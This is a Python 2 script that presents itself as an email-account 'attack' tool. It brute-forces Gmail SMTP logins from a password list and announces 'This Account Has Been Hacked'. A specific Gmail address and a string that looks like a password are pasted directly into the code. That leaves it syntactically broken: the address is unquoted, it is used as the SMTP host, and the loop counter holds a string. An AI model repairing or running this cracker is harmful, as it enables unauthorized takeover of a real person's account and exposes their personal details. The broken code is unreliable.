#!/usr/bin/python
'''create by Ha3MrX'''

import smtplib
from os import system

def main():
   print '================================================='
   print '               create by Ha3MrX                  '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print '           HA3MrX                                '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()   V.1.0        '

main()
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('evacristiana@gmail.com :')
    server = smtplib.SMTP_SSL('evacristiana@gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = harusbisa1407
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(evacristiana@gmail.com, harusbisa1407)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + harusbisa1407 + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + harusbisa1407 + '     ^_^'

            break
         else:
            print '[!] passwordfound => ' + harusbisa1407
login()
